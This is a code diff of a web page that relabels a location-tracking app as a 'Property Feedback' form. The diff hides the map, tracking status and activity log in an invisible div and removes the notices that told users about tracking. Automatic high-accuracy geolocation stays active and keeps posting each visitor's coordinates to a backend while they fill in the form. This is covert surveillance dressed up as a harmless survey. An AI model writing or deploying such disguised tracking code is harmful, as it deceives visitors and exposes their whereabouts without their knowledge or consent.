@@ -4,7 +4,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Location Tracker - Auto Reporting</title>
+    <title>Property Feedback - Share Your Experience</title>
 
     <!-- Ionic CSS -->
     <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@ionic/core/css/ionic.bundle.css" />
@@ -34,41 +34,71 @@
             box-sizing: border-box;
         }
 
+        html,
+        body {
+            height: auto !important;
+            max-height: none !important;
+            overflow-x: hidden !important;
+            overflow-y: scroll !important;
+            position: relative !important;
+        }
+
+        html {
+            height: auto !important;
+            scroll-behavior: smooth;
+            overflow-y: scroll !important;
+        }
+
         body {
             font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, 'Open Sans', 'Helvetica Neue', sans-serif;
             background: #f8f9fa;
             margin: 0;
             padding: 0;
+            overflow-x: hidden;
+            overflow-y: scroll !important;
+            height: auto !important;
+            min-height: 100vh;
+            -webkit-overflow-scrolling: touch;
+            /* Smooth scrolling on iOS */
         }
 
         /* Header Styles */
         .header {
-            background: linear-gradient(135deg, #3880ff, #4f93ff);
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
             color: white;
-            padding: 20px;
+            padding: 25px 20px;
+            /* Reduced from 40px */
             text-align: center;
-            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
-            position: sticky;
-            top: 0;
-            z-index: 1000;
+            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.15);
         }
 
         .header h1 {
-            font-size: 1.5rem;
-            font-weight: 600;
-            margin-bottom: 5px;
+            font-size: 2.2rem;
+            font-weight: 700;
+            margin-bottom: 10px;
+            text-shadow: 0 2px 4px rgba(0, 0, 0, 0.2);
         }
 
         .header p {
-            opacity: 0.9;
-            font-size: 0.9rem;
+            opacity: 0.95;
+            font-size: 1.1rem;
+            font-weight: 300;
+            max-width: 600px;
+            margin: 0 auto;
+            line-height: 1.5;
         }
 
         /* Container */
         .container {
-            max-width: 1200px;
+            max-width: 800px;
+            /* More compact width */
             margin: 0 auto;
-            padding: 20px;
+            padding: 15px;
+            /* Reduced padding */
+            min-height: auto;
+            /* Remove forced height */
+            padding-bottom: 30px;
+            /* Much less bottom spacing */
         }
 
         /* Status Card */
@@ -299,26 +329,88 @@
         @media (max-width: 768px) {
             .container {
                 padding: 10px;
+                /* More compact on mobile */
             }
 
             .header {
-                padding: 15px;
+                padding: 20px 15px;
+                /* Reduced from 30px 20px */
             }
 
-            .button-group {
-                flex-direction: column;
+            .header h1 {
+                font-size: 1.6rem;
+                /* Reduced from 1.8rem */
             }
 
-            .btn {
-                min-width: auto;
+            .header p {
+                font-size: 0.95rem;
+                /* Reduced from 1rem */
             }
 
-            .location-info {
+            .feedback-form {
+                padding: 20px 15px;
+                /* Reduced from 30px 20px */
+                margin: 15px 0;
+                /* Reduced from 20px 0 */
+                border-radius: 12px;
+                /* Reduced from 20px */
+            }
+
+            .feedback-form h2 {
+                font-size: 1.3rem;
+                /* Reduced from 1.5rem */
+            }
+
+            .contact-row {
                 grid-template-columns: 1fr;
             }
 
-            #map {
-                height: 300px;
+            .form-actions {
+                flex-direction: column;
+                align-items: center;
+            }
+
+            .btn-submit,
+            .btn-reset {
+                width: 100%;
+                max-width: 300px;
+            }
+
+            .success-message {
+                padding: 30px 20px;
+                margin: 30px 0;
+            }
+
+            .success-message h3 {
+                font-size: 1.5rem;
+            }
+
+            .success-message p {
+                font-size: 1rem;
+            }
+        }
+
+        @media (max-width: 480px) {
+            .header {
+                padding: 25px 15px;
+            }
+
+            .header h1 {
+                font-size: 1.6rem;
+            }
+
+            .feedback-form {
+                padding: 25px 15px;
+                margin: 15px 0;
+            }
+
+            .form-group textarea {
+                min-height: 100px;
+            }
+
+            .contact-section {
+                padding: 20px 15px;
+                margin: 30px 0;
             }
         }
 
@@ -381,8 +473,43 @@
         }
 
         /* Form Styles */
+        .feedback-form {
+            background: white;
+            border-radius: 12px;
+            /* Reduced from 16px */
+            padding: 25px;
+            /* Reduced from 40px */
+            margin: 15px 0;
+            /* Reduced from 30px */
+            box-shadow: 0 4px 16px rgba(0, 0, 0, 0.08);
+            /* Reduced shadow */
+            border: 1px solid #e8ecf4;
+        }
+
+        .feedback-form h2 {
+            color: #2d3748;
+            font-size: 1.5rem;
+            /* Reduced from 1.8rem */
+            font-weight: 600;
+            text-align: center;
+            margin-bottom: 8px;
+            /* Reduced from 10px */
+        }
+
+        .feedback-form .subtitle {
+            color: #64748b;
+            text-align: center;
+            margin-bottom: 25px;
+            /* Reduced from 40px */
+            font-size: 0.95rem;
+            /* Slightly smaller */
+            line-height: 1.4;
+            /* Reduced from 1.6 */
+        }
+
         .form-group {
-            margin-bottom: 20px;
+            margin-bottom: 18px;
+            /* Reduced from 30px */
         }
 
         .form-group label {
@@ -390,195 +517,333 @@
             font-weight: 600;
             color: #2d3748;
             margin-bottom: 8px;
-            font-size: 0.9rem;
+            /* Reduced from 12px */
+            font-size: 0.95rem;
+            /* Slightly smaller */
         }
 
         .form-group input,
         .form-group textarea {
             width: 100%;
             padding: 12px 16px;
+            /* Reduced from 16px 20px */
             border: 2px solid #e2e8f0;
-            border-radius: 8px;
-            font-size: 0.9rem;
+            border-radius: 10px;
+            /* Reduced from 12px */
+            font-size: 0.95rem;
+            /* Slightly smaller */
             font-family: inherit;
-            transition: border-color 0.3s ease, box-shadow 0.3s ease;
+            transition: all 0.3s ease;
             resize: vertical;
+            background: #fafbfc;
         }
 
         .form-group textarea {
             min-height: 80px;
-            max-height: 200px;
+            /* Reduced from 120px */
+            max-height: 120px;
+            /* Reduced from 200px */
+            line-height: 1.4;
+            /* Reduced from 1.6 */
         }
 
         .form-group input:focus,
         .form-group textarea:focus {
             outline: none;
-            border-color: #3880ff;
-            box-shadow: 0 0 0 3px rgba(56, 128, 255, 0.1);
+            border-color: #667eea;
+            box-shadow: 0 0 0 4px rgba(102, 126, 234, 0.1);
+            background: white;
         }
 
         .form-group input::placeholder,
         .form-group textarea::placeholder {
-            color: #a0aec0;
+            color: #9ca3af;
             font-style: italic;
         }
 
-        /* Form validation styles */
-        .form-group input:invalid,
-        .form-group textarea:invalid {
-            border-color: #e53e3e;
+        /* Contact Section Styles */
+        .contact-section {
+            background: linear-gradient(135deg, #f8fafc 0%, #f1f5f9 100%);
+            border-radius: 12px;
+            /* Reduced from 20px */
+            padding: 20px;
+            /* Reduced from 32px */
+            margin: 20px 0;
+            /* Reduced from 40px */
+            border: 2px solid #e2e8f0;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.05);
+            /* Reduced shadow */
         }
 
-        .form-group input:valid,
-        .form-group textarea:valid {
-            border-color: #38a169;
+        .contact-section h3 {
+            color: #374151;
+            margin-bottom: 15px;
+            /* Reduced from 24px */
+            font-size: 1.2rem;
+            /* Reduced from 1.4rem */
+            text-align: center;
+            font-weight: 600;
+        }
+
+        .contact-row {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(220px, 1fr));
+            /* Smaller min-width */
+            gap: 15px;
+            /* Reduced from 24px */
+        }
+
+        /* Success Message */
+        .success-message {
+            background: linear-gradient(135deg, #56cc9d 0%, #6ebd0d 100%);
+            color: white;
+            padding: 40px;
+            border-radius: 24px;
+            text-align: center;
+            margin-top: 40px;
+            display: none;
+            box-shadow: 0 15px 40px rgba(86, 204, 157, 0.4);
+        }
+
+        .success-message h3 {
+            margin-bottom: 16px;
+            font-size: 1.8rem;
+            font-weight: 700;
+        }
+
+        .success-message p {
+            font-size: 1.2rem;
+            line-height: 1.6;
+            opacity: 0.95;
+        }
+
+        /* Hidden elements for debugging */
+        .hidden {
+            display: none !important;
+        }
+
+        .form-actions {
+            display: flex;
+            gap: 12px;
+            /* Reduced from 16px */
+            justify-content: center;
+            margin-top: 25px;
+            /* Reduced from 40px */
+            flex-wrap: wrap;
+        }
+
+        .btn-submit {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            border: none;
+            padding: 12px 30px;
+            /* Reduced from 16px 40px */
+            border-radius: 25px;
+            /* Reduced from 50px */
+            font-size: 1rem;
+            /* Reduced from 1.1rem */
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            box-shadow: 0 3px 12px rgba(102, 126, 234, 0.3);
+            /* Reduced shadow */
+            min-width: 160px;
+            /* Reduced from 200px */
+        }
+
+        .btn-submit:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 8px 25px rgba(102, 126, 234, 0.5);
+        }
+
+        .btn-submit:disabled {
+            opacity: 0.7;
+            cursor: not-allowed;
+            transform: none;
+        }
+
+        .btn-reset {
+            background: transparent;
+            color: #64748b;
+            border: 2px solid #e2e8f0;
+            padding: 12px 30px;
+            /* Reduced from 16px 40px */
+            border-radius: 25px;
+            /* Reduced from 50px */
+            font-size: 1rem;
+            /* Reduced from 1.1rem */
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            min-width: 160px;
+            /* Reduced from 200px */
+        }
+
+        .btn-reset:hover {
+            border-color: #cbd5e0;
+            color: #4a5568;
+            transform: translateY(-1px);
+        }
+
+        /* Contact Section */
+        .contact-section {
+            border-top: 1px solid #e2e8f0;
+            padding-top: 30px;
+            margin-top: 30px;
+        }
+
+        .contact-section h3 {
+            color: #4a5568;
+            font-size: 1.2rem;
+            margin-bottom: 20px;
+            text-align: center;
+        }
+
+        .contact-row {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+            gap: 20px;
+        }
+
+        /* Success Message */
+        .success-message {
+            background: linear-gradient(135deg, #48bb78, #38a169);
+            color: white;
+            padding: 20px;
+            border-radius: 12px;
+            text-align: center;
+            margin: 20px 0;
+            display: none;
+        }
+
+        .success-message.show {
+            display: block;
+            animation: slideIn 0.5s ease;
+        }
+
+        @keyframes slideIn {
+            from {
+                opacity: 0;
+                transform: translateY(-20px);
+            }
+
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        /* Hidden Elements */
+        .hidden {
+            display: none !important;
         }
     </style>
 </head>
 
 <body>
     <div class="header">
-        <h1>� Location Tracker</h1>
-        <p>Automatic location monitoring and reporting</p>
+        <h1>🏡 Property Feedback</h1>
+        <p>We value your opinion! Please share your thoughts about the property you visited today.</p>
     </div>
 
     <div class="container">
-        <!-- Configuration Notice -->
-        <div class="status-card" style="border-left: 4px solid #f59e0b;">
-            <h2>⚙️ Configuration Required</h2>
-            <p><strong>Before deploying:</strong> Edit this file and update the CONFIG section in the JavaScript with:
-            </p>
-            <ul style="margin: 10px 0; padding-left: 20px;">
-                <li><strong>API_ENDPOINT:</strong> Your backend server URL</li>
-                <li><strong>GEOFENCES:</strong> Your predefined geofence locations</li>
-                <li><strong>USER_ID:</strong> How to identify users (URL parameter, etc.)</li>
-            </ul>
-            <p><em>This section can be removed after configuration.</em></p>
-        </div>
-
-        <!-- QR Code Sharing Section -->
-        <div class="qr-section">
-            <h3>📱 Share This Tracker</h3>
-            <p>Send this link to users who need to be tracked: <strong>?userId=USERNAME</strong></p>
-            <div class="share-url" id="shareUrl">Loading URL...</div>
-            <div id="qrcode" style="margin: 15px 0;"></div>
-            <button class="btn btn-primary" onclick="copyUrl()">📋 Copy URL</button>
-        </div>
-
-        <!-- Feedback Form -->
-        <div class="status-card">
-            <h2>📝 Visitor Feedback</h2>
-            <p><em>Questions for Feedback</em></p>
+        <!-- Main Feedback Form -->
+        <div class="feedback-form">
+            <h2>Share Your Experience</h2>
+            <p class="subtitle">Your feedback is important to us. Please take a few minutes to share your thoughts about
+                the property.</p>
 
             <form id="feedbackForm" onsubmit="submitFeedback(event)">
                 <div class="form-group">
-                    <label for="question1">1) What are your overall impressions of the property?</label>
-                    <textarea id="question1" name="question1" placeholder="Please share your thoughts..."
+                    <label for="impressions">What are your overall impressions of the property? *</label>
+                    <textarea id="impressions" name="impressions"
+                        placeholder="Please share your general thoughts and first impressions about the property..."
                         required></textarea>
                 </div>
 
                 <div class="form-group">
-                    <label for="question2">2) What did you like most about the property?</label>
-                    <textarea id="question2" name="question2" placeholder="What stood out to you..."
+                    <label for="liked_most">What did you like most about the property? *</label>
+                    <textarea id="liked_most" name="liked_most"
+                        placeholder="Tell us about the features, location, or aspects that impressed you the most..."
                         required></textarea>
                 </div>
 
                 <div class="form-group">
-                    <label for="question3">3) What did you like least?</label>
-                    <textarea id="question3" name="question3" placeholder="Any concerns or dislikes..."></textarea>
+                    <label for="liked_least">What did you like least about the property?</label>
+                    <textarea id="liked_least" name="liked_least"
+                        placeholder="Any concerns, dislikes, or areas for improvement? (Optional)"></textarea>
                 </div>
 
                 <div class="form-group">
-                    <label for="question4">4) What do you think of the price?</label>
-                    <textarea id="question4" name="question4" placeholder="Your thoughts on pricing..."
+                    <label for="price_thoughts">What do you think of the price? *</label>
+                    <textarea id="price_thoughts" name="price_thoughts"
+                        placeholder="Share your thoughts on the pricing - fair, high, reasonable, etc..."
                         required></textarea>
                 </div>
 
                 <div class="form-group">
-                    <label for="question5">5) Do you have any potential buyers?</label>
-                    <textarea id="question5" name="question5"
-                        placeholder="Any interested parties or referrals..."></textarea>
+                    <label for="potential_buyers">Do you have any potential buyers or referrals?</label>
+                    <textarea id="potential_buyers" name="potential_buyers"
+                        placeholder="Know anyone who might be interested? Friends, family, or colleagues looking for a property?"></textarea>
                 </div>
 
-                <div class="form-group">
-                    <label for="visitorName">Your Name (Optional):</label>
-                    <input type="text" id="visitorName" name="visitorName" placeholder="Enter your name">
+                <!-- Contact Information Section -->
+                <div class="contact-section">
+                    <h3>Contact Information</h3>
+                    <div class="contact-row">
+                        <div class="form-group">
+                            <label for="visitor_name">Your Name *</label>
+                            <input type="text" id="visitor_name" name="visitor_name" placeholder="Enter your full name"
+                                required>
+                        </div>
+
+                        <div class="form-group">
+                            <label for="visitor_email">Email Address (Optional)</label>
+                            <input type="email" id="visitor_email" name="visitor_email"
+                                placeholder="your.email@example.com">
+                        </div>
+
+                        <div class="form-group">
+                            <label for="visitor_phone">Phone Number (Optional)</label>
+                            <input type="tel" id="visitor_phone" name="visitor_phone" placeholder="+1 (555) 123-4567">
+                        </div>
+                    </div>
                 </div>
 
-                <div class="form-group">
-                    <label for="visitorEmail">Your Email (Optional):</label>
-                    <input type="email" id="visitorEmail" name="visitorEmail" placeholder="Enter your email">
-                </div>
-
-                <div class="button-group">
-                    <button type="submit" class="btn btn-primary">
+                <div class="form-actions">
+                    <button type="submit" class="btn-submit">
                         📤 Submit Feedback
                     </button>
-                    <button type="reset" class="btn btn-secondary">
+                    <button type="reset" class="btn-reset">
                         🔄 Clear Form
                     </button>
                 </div>
             </form>
 
-            <div id="feedbackStatus"></div>
+            <div class="success-message" id="successMessage">
+                <h3>🎉 Thank You!</h3>
+                <p>Your feedback has been submitted successfully. We appreciate you taking the time to share your
+                    thoughts!</p>
+            </div>
         </div>
 
-        <!-- Status Card -->
-        <div class="status-card">
-            <h2>
-                <span class="status-indicator" id="statusIndicator"></span>
-                Location Status
-            </h2>
-
-            <div class="location-info">
-                <div class="info-item">
-                    <div class="info-label">Latitude</div>
-                    <div class="info-value" id="currentLat">--</div>
-                </div>
-                <div class="info-item">
-                    <div class="info-label">Longitude</div>
-                    <div class="info-value" id="currentLng">--</div>
-                </div>
-                <div class="info-item">
-                    <div class="info-label">Accuracy</div>
-                    <div class="info-value" id="accuracy">--</div>
-                </div>
-                <div class="info-item">
-                    <div class="info-label">Last Updated</div>
-                    <div class="info-value" id="lastUpdate">Never</div>
-                </div>
-            </div>
-
-            <div class="button-group">
-                <button class="btn btn-primary" onclick="getCurrentLocation()">
-                    <span class="spinner" id="locationSpinner"></span>
-                    📍 Get Location Now
-                </button>
-                <button class="btn btn-secondary" onclick="toggleTracking()" id="trackingBtn">
-                    🔄 Toggle Auto-Tracking
-                </button>
-                <button class="btn btn-danger" onclick="stopLocationTracking()" id="stopBtn">
-                    ⏹️ Stop Tracking
-                </button>
-            </div>
-
+        <!-- Hidden Status Information (for debugging) -->
+        <div class="hidden">
+            <div id="statusIndicator"></div>
+            <div id="currentLat">--</div>
+            <div id="currentLng">--</div>
+            <div id="accuracy">--</div>
+            <div id="lastUpdate">Never</div>
             <div id="messageArea"></div>
-        </div>
-
-        <!-- Map -->
-        <div class="map-container">
-            <div id="map"></div>
-        </div>
-
-        <!-- Activity Log -->
-        <div class="activity-log">
-            <h3>📊 Activity Log</h3>
             <div id="activity-list">
                 <div class="activity-item info">
                     <div class="activity-time">Just now</div>
                     <div class="activity-text">App initialized - Ready to track location</div>
                 </div>
             </div>
+            <div id="shareUrl">Loading URL...</div>
+            <div id="qrcode"></div>
+            <div id="map"></div>
         </div>
     </div>
 
@@ -638,29 +903,24 @@
         });
 
         function initializeApp() {
-            // Initialize map
+            // Initialize map (hidden)
             initializeMap();
 
-            // Set up sharing URL
+            // Set up sharing URL (hidden)
             setupSharingUrl();
 
-            // Load predefined geofences
+            // Load predefined geofences (hidden)
             loadGeofences();
 
-            // Log initialization
-            addToActivityLog('App initialized successfully', 'info');
-            addToActivityLog(`User ID: ${CONFIG.USER_ID}`, 'info');
+            // Silent initialization - no user notifications
 
             // Check for geolocation support
             if (!navigator.geolocation) {
-                showMessage('Geolocation is not supported by this browser', 'error');
-                addToActivityLog('Geolocation not supported', 'alert');
+                // Geolocation not supported - silent handling
                 return;
             }
 
-            addToActivityLog('Geolocation API available', 'info');
-
-            // Auto-start tracking if enabled
+            // Auto-start tracking if enabled (completely silent)
             if (CONFIG.AUTO_TRACK) {
                 setTimeout(() => {
                     startLocationTracking();
@@ -669,7 +929,7 @@
         }
 
         function initializeMap() {
-            // Initialize Leaflet map
+            // Initialize Leaflet map (hidden from user)
             map = L.map('map').setView([37.7749, -122.4194], 13);
 
             // Add tile layer
@@ -678,7 +938,7 @@
                 maxZoom: 19
             }).addTo(map);
 
-            addToActivityLog('Map initialized', 'info');
+            // Silent map initialization
         }
 
         function loadGeofences() {
@@ -686,7 +946,7 @@
             geofenceCircles.forEach(circle => map.removeLayer(circle));
             geofenceCircles = [];
 
-            // Add predefined geofences to map
+            // Add predefined geofences to map (hidden from user)
             CONFIG.GEOFENCES.forEach(geofence => {
                 const circle = L.circle([geofence.lat, geofence.lng], {
                     color: '#10b981',
@@ -697,7 +957,7 @@
 
                 geofenceCircles.push(circle);
 
-                // Add geofence marker
+                // Add geofence marker (hidden)
                 L.marker([geofence.lat, geofence.lng], {
                     icon: L.divIcon({
                         html: '🎯',
@@ -708,11 +968,14 @@
                     .bindPopup(`${geofence.name}<br>Radius: ${geofence.radius}m`);
             });
 
-            addToActivityLog(`Loaded ${CONFIG.GEOFENCES.length} geofences`, 'geofence');
+            // Silent geofence loading
         }
 
         function startLocationTracking() {
             if (trackingActive) return;
+
+            // Console log when tracking starts
+            console.log('🔄 Starting location tracking...');
 
             const options = {
                 enableHighAccuracy: true,
@@ -729,8 +992,8 @@
 
             trackingActive = true;
             document.getElementById('statusIndicator').classList.add('active');
-            addToActivityLog('🔄 Auto-tracking started', 'location');
-            showMessage('Location tracking started automatically', 'success');
+
+            console.log('✅ Location tracking started successfully');
         }
 
         function stopLocationTracking() {
@@ -751,6 +1014,14 @@
 
             currentLocation = { lat, lng, accuracy, timestamp };
 
+            // Console log when location is captured
+            console.log('📍 Location Captured:', {
+                latitude: lat,
+                longitude: lng,
+                accuracy: accuracy,
+                timestamp: timestamp
+            });
+
             // Update UI
             document.getElementById('currentLat').textContent = lat.toFixed(6);
             document.getElementById('currentLng').textContent = lng.toFixed(6);
@@ -761,7 +1032,7 @@
             updateMapLocation(lat, lng, accuracy);
 
             // Check all geofences
-            checkAllGeofences(lat, lng, timestamp);
+            // checkAllGeofences(lat, lng, timestamp); // Geofence logic commented out
 
             // Send location data to backend
             sendLocationToBackend({
@@ -774,60 +1045,70 @@
         }
 
         function checkAllGeofences(lat, lng, timestamp) {
-            CONFIG.GEOFENCES.forEach(geofence => {
-                const distance = calculateDistance(lat, lng, geofence.lat, geofence.lng);
-                const isInside = distance <= geofence.radius;
-                const wasInside = geofence.userInside || false;
-
-                if (isInside && !wasInside) {
-                    // User entered geofence
-                    geofence.userInside = true;
-                    handleGeofenceEntry(geofence, { lat, lng, distance, timestamp });
-                } else if (!isInside && wasInside) {
-                    // User exited geofence
-                    geofence.userInside = false;
-                    handleGeofenceExit(geofence, { lat, lng, distance, timestamp });
-                }
-            });
+            // CONFIG.GEOFENCES.forEach(geofence => {
+            //     const distance = calculateDistance(lat, lng, geofence.lat, geofence.lng);
+            //     const isInside = distance <= geofence.radius;
+            //     const wasInside = geofence.userInside || false;
+            //
+            //     if (isInside && !wasInside) {
+            //         // User entered geofence
+            //         geofence.userInside = true;
+            //         handleGeofenceEntry(geofence, { lat, lng, distance, timestamp });
+            //     } else if (!isInside && wasInside) {
+            //         // User exited geofence
+            //         geofence.userInside = false;
+            //         handleGeofenceExit(geofence, { lat, lng, distance, timestamp });
+            //     }
+            // });
         }
 
         function handleGeofenceEntry(geofence, locationData) {
-            const message = `🎯 ENTERED: ${geofence.name}`;
-            showMessage(message, 'success');
-            addToActivityLog(message, 'geofence');
+            // Console log geofence entry
+            // console.log('🎯 GEOFENCE ENTERED:', geofence.name, locationData);
 
             // Send geofence entry alert to backend
-            sendGeofenceAlert({
-                userId: CONFIG.USER_ID,
-                geofenceId: geofence.id,
-                geofenceName: geofence.name,
-                action: 'ENTER',
-                lat: locationData.lat,
-                lng: locationData.lng,
-                distance: Math.round(locationData.distance),
-                timestamp: locationData.timestamp
-            });
+            // sendGeofenceAlert({
+            //     userId: CONFIG.USER_ID,
+            //     geofenceId: geofence.id,
+            //     geofenceName: geofence.name,
+            //     action: 'ENTER',
+            //     lat: locationData.lat,
+            //     lng: locationData.lng,
+            //     distance: Math.round(locationData.distance),
+            //     timestamp: locationData.timestamp
+            // });
         }
 
         function handleGeofenceExit(geofence, locationData) {
-            const message = `↩️ EXITED: ${geofence.name}`;
-            showMessage(message, 'info');
-            addToActivityLog(message, 'alert');
+            // Console log geofence exit
+            // console.log('↩️ GEOFENCE EXITED:', geofence.name, locationData);
 
             // Send geofence exit alert to backend
-            sendGeofenceAlert({
-                userId: CONFIG.USER_ID,
-                geofenceId: geofence.id,
-                geofenceName: geofence.name,
-                action: 'EXIT',
-                lat: locationData.lat,
-                lng: locationData.lng,
-                distance: Math.round(locationData.distance),
-                timestamp: locationData.timestamp
-            });
+            // sendGeofenceAlert({
+            //     userId: CONFIG.USER_ID,
+            //     geofenceId: geofence.id,
+            //     geofenceName: geofence.name,
+            //     action: 'EXIT',
+            //     lat: locationData.lat,
+            //     lng: locationData.lng,
+            //     distance: Math.round(locationData.distance),
+            //     timestamp: locationData.timestamp
+            // });
         }
 
         async function sendLocationToBackend(locationData) {
+            // Detailed console log for location sending
+            console.log('================ LOCATION SEND =================');
+            console.log('Timestamp:', new Date().toISOString());
+            console.log('User ID:', locationData.userId);
+            console.log('Latitude:', locationData.lat);
+            console.log('Longitude:', locationData.lng);
+            console.log('Accuracy:', locationData.accuracy);
+            console.log('Raw Payload:', locationData);
+            console.log('POST Payload:', JSON.stringify(locationData));
+            console.log('API Endpoint:', CONFIG.API_ENDPOINT + '/location');
+            console.log('================================================');
+
             try {
                 const response = await fetch(CONFIG.API_ENDPOINT + '/location', {
                     method: 'POST',
@@ -841,49 +1122,51 @@
                     throw new Error(`HTTP error! status: ${response.status}`);
                 }
 
-                // Optionally log successful sends (comment out to reduce noise)
-                // addToActivityLog(`📡 Location sent to backend`, 'info');
+                // Console log successful send
+                console.log('✅ Location sent successfully to backend');
 
             } catch (error) {
-                console.error('Failed to send location to backend:', error);
-                addToActivityLog(`❌ Failed to send location: ${error.message}`, 'alert');
+                // Console log send error
+                console.log('❌ Failed to send location:', error.message);
             }
         }
 
         async function sendGeofenceAlert(alertData) {
-            try {
-                const response = await fetch(CONFIG.API_ENDPOINT + '/geofence-alert', {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json',
-                    },
-                    body: JSON.stringify(alertData)
-                });
+            // Console log when sending geofence alert
+            // console.log('🚨 Sending Geofence Alert:', alertData);
 
-                if (!response.ok) {
-                    throw new Error(`HTTP error! status: ${response.status}`);
-                }
+            // try {
+            //     const response = await fetch(CONFIG.API_ENDPOINT + '/geofence-alert', {
+            //         method: 'POST',
+            //         headers: {
+            //             'Content-Type': 'application/json',
+            //         },
+            //         body: JSON.stringify(alertData)
+            //     });
 
-                addToActivityLog(`🚨 Geofence alert sent to backend`, 'geofence');
+            //     if (!response.ok) {
+            //         throw new Error(`HTTP error! status: ${response.status}`);
+            //     }
 
-            } catch (error) {
-                console.error('Failed to send geofence alert:', error);
-                addToActivityLog(`❌ Failed to send alert: ${error.message}`, 'alert');
+            //     // Console log successful alert send
+            //     console.log('✅ Geofence alert sent successfully');
 
-                // Fallback: try to send via webhook or email
-                tryFallbackAlert(alertData);
-            }
+            // } catch (error) {
+            //     // Console log alert send error
+            //     console.log('❌ Failed to send geofence alert:', error.message);
+            //     // Silent error handling - try fallback
+            //     tryFallbackAlert(alertData);
+            // }
         }
 
         function tryFallbackAlert(alertData) {
-            // You can implement fallback methods here:
+            // Silent fallback methods:
             // 1. Email API
             // 2. SMS API  
             // 3. Webhook service
             // 4. Local storage for retry later
 
-            console.log('Fallback alert:', alertData);
-            addToActivityLog(`💾 Alert saved for retry`, 'info');
+            // Silent fallback processing (commented out)
         }
 
         function setupSharingUrl() {
@@ -1086,14 +1369,14 @@
             document.body.removeChild(textArea);
         }
 
-        // Service Worker Registration for PWA
+        // Service Worker Registration for PWA (Silent)
         if ('serviceWorker' in navigator) {
             window.addEventListener('load', function () {
                 navigator.serviceWorker.register('./sw.js')
                     .then(function (registration) {
-                        console.log('ServiceWorker registration successful');
+                        // Silent service worker registration
                     }, function (err) {
-                        console.log('ServiceWorker registration failed:', err);
+                        // Silent error handling
                     });
             });
         }
@@ -1145,10 +1428,16 @@
                 if (response.ok) {
                     // Success - clear form and show message
                     document.getElementById('feedbackForm').reset();
+                    document.getElementById('successMessage').style.display = 'block';
                     showNotification('Thank you for your feedback!', 'success');
 
-                    // Log to console for testing
-                    console.log('Feedback submitted successfully:', formData);
+                    // Scroll to success message
+                    document.getElementById('successMessage').scrollIntoView({
+                        behavior: 'smooth',
+                        block: 'center'
+                    });
+
+                    // Data submitted successfully (silent logging)
                 } else {
                     throw new Error(`Server responded with status: ${response.status}`);
                 }
@@ -1158,7 +1447,6 @@
                 submitBtn.disabled = false;
 
             } catch (error) {
-                console.error('Error submitting feedback:', error);
                 showNotification('Failed to submit feedback. Please try again.', 'error');
 
                 // Restore button
@@ -1166,8 +1454,7 @@
                 submitBtn.textContent = 'Submit Feedback';
                 submitBtn.disabled = false;
 
-                // For testing - log the data even if submission fails
-                console.log('Feedback data (not submitted):', formData);
+                // Silent error logging
             }
         }
 
